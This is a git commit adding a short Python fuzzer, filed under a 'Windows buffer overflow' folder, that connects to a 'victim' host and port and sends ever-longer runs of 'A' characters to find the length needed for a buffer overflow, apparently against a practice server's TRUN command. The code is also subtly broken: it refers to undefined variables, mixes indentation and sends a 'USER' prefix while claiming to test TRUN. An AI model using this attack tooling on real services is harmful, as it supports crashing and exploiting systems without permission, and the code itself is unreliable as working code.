100e582812c6efef1a0e9beeafc189915fddc3c8
Li Xiu Ying <53060492+Arken2@users.noreply.github.com>
2019-07-18 16:12:19 -0400

    Create Fuzzer.py

---
+++ Windows buffer overflow/Fuzzer.py
@@ -0,0 +1,18 @@
+#A fuzzer for finding the buffer legnth
+
+import socket
+
+victim_host = <Enter IP of victim>
+victim_port = <Enter port of BOF>
+
+for i in range(3000):
+  FUZZ = 'A' * i
+	establish = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connection = establish.connect((server, sport))
+	print(s.recv(1024))
+	s.send(('USER .' + FUZZ + '\r\n'))
+	print(establish.recv(1024))
+	print("Sending attack length ", len(FUZZ), ' to TRUN .')
+	establish.send('EXIT\r\n')
+	print(s.recv(1024))
+s.close()
